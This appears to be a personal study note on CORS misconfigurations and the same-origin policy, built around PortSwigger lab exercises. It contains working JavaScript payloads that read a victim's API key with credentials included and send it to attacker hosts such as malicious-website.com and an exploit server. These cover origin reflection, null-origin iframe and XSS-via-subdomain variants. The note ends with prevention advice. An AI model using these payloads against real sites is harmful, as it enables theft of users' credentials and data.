
- CORS relaxes the **same-origin policy (SOP)**. Misconfigured CORS policies lead to information leaks, authentication bypass and account takeover.

#### Same-Origin Policy

- The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.
- It generally allows a domain to issue requests to other domains, but not to access the responses.
- Cross-origin loading of page resources is generally permitted. For example, the SOP allows embedding of images via the `<img>` tag, media via the `<video>` tag and JavaScript via the `<script>` tag. However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.
- Cookies are often accessible from all subdomains of a site even though each subdomain is technically a different origin. You can partially mitigate this risk using the `HttpOnly` cookie flag.

![[Schermata del 2024-11-19 14-57-24.png]]

- A script from page A can access data from page B only if the pages are on the same origin.
- SOP protects cookies (like session cookies).

## How does CORS work?

- The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted.
- The `Access-Control-Allow-Origin` header is included in the response from one website to a request originated from another website and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
- Usually when we send a request from a website `normal-website.com` to another domain `robust-website.com` the browser puts in the request the following header to make the server know what's the *origin* of the request:

```http
Origin: https://normal-website.com
```

The request would be like this:

```http
GET /data HTTP/1.1
Host: robust-website.com 
Origin: https://normal-website.com
```

If `robust-website.com` uses SOP, then its response is dropped when arrives at the web browser.
If instead it uses CORS, the server on `robust-website.com` returns the following response:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

The browser will allow code running on `normal-website.com` to access the response because the origins match.

The specification of `Access-Control-Allow-Origin` allows for multiple origins, or the value `null`, or the wildcard `*`.

- The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS `Access-Control-Allow-Credentials` header to true.

###### Request
```http
GET /data HTTP/1.1 
Host: robust-website.com 
... 
Origin: https://normal-website.com 
Cookie: JSESSIONID=<value>
```
###### Response
```http
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://normal-website.com 
Access-Control-Allow-Credentials: true
```

## Vulnerabilities and common mistakes

###### Lab: CORS vulnerability with basic origin reflection 

```html
<script>  
fetch('https://0afa00b803fd481c83315b74001800f2.web-security-academy.net/accountDetails', {credentials:'include'})  
.then(r => r.json())  
.then(j => j.apikey)  
.then(key => new Image().src = 'https://exploit-0a8400fa03dc48d983915a59015a001f.exploit-server.net/landing?key=' + key)  
</script>
```

or: 
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; 
req.send();

function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
</script>
```

#### Whitelisted null origin value

The Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

Some applications might whitelist the `null` origin to support local development of the application. 
In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

##### Lab: CORS vulnerability with trusted null origin

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); 
function reqListener() { 
location='malicious-website.com/log?key='+this.responseText; 
}; 
</script>"></iframe>
```

or:

```html
<iframe sandbox='allow-scripts' srcdoc="  
<script>  
fetch('https://0a410099045171e580469e84007f0045.web-security-academy.net/accountDetails', {credentials:'include'})  
.then(r => r.json())  
.then(j => j.apikey)  
.then(key => new Image().src = 'https://exploit-0a6f009f04b871d680409dd001e90071.exploit-server.net/landing?key=' + key)  
</script>  
"></iframe>
```

#### Exploiting XSS via CORS trust relationships

If a website trusts an origin that is vulnerable to cross-site scripting ([[XSS (Cross-Site Scripting)]]), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

#### Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
In this situation, an attacker who is in a position to intercept a victim user's traffic (*man-in-the-middle attack*) can exploit the CORS configuration to compromise the victim's interaction with the application.

##### Lab: CORS vulnerability with trusted insecure protocols

```html
<script>  
location = 'http://stock.0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/?storeId=1&productId=<script>' +  
`fetch('https://0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/accountDetails', {credentials:'include'}).then(r => r.json()).then(j => j.apikey).then(key => new Image().src = 'https://exploit-0abc00170467a065818e42b2012e0081.exploit-server.net/landing?key=' %2B key)` +  // don't forget to URLEncode the + (otherwise, it is a space)  
'<' + '/script>'  // or encode the < as %3C  
</script>
```

Here, we've found a HTTP subdomain `http://stock.0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/?storeId=1&productId=1` where `productId` suffers of XSS and the main domain `https://0aff008c0471a03181e3434c00ad00c8.web-security-academy.net/` CORS configuration accepts requests from the vulnerable stock subdomain. Hence, we can inject code (XSS) that forces the victim to make a request from the stock subdomain to the main domain, making the victim unconsciously sending us the apiKey.

## Prevention

- Specify the Access-Control-Allow-Origin header if the response contains sensitive data
- Think if you really need `Access-Control-Allow-Origin: *`
- Double think if you really need `Access-Control-Allow-Credentials: true`
- Use allow lists
- Don’t allow the origin null